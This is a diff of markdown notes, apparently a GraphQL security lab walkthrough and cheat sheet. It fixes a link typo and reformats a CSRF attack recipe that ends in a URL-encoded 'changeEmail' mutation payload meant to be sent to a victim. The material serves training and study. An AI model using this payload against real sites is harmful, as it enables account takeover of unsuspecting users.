@@ -15,7 +15,7 @@
 ## Walkthrough - Most Important Labs
 
 - [GraphQL API exposure private field](GraphQL-API-exposure-private-field.md)
-- [GrapQL brute-force via grapql ALIASES (script aliases-generator)](grapql-bruteforce-via-aliases.md)
+- [GrapQL brute-force via grapql ALIASES (script aliases-generator)](graphql-bruteforce-via-aliases.md)
 
 ## Cheat Sheet
 
@@ -47,7 +47,9 @@ done
 ```
 
 > Login accept x-www-form?
+
 > CSRF -> change content-type to application/x-www-form-urlencoded -> modify the necessary parameters -> Engagement tools -> Generate CSRF -> send to victim
+
 > Adapt the body to url format:
 ```bash
     query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22foo%40foo.com%22%7D%7D
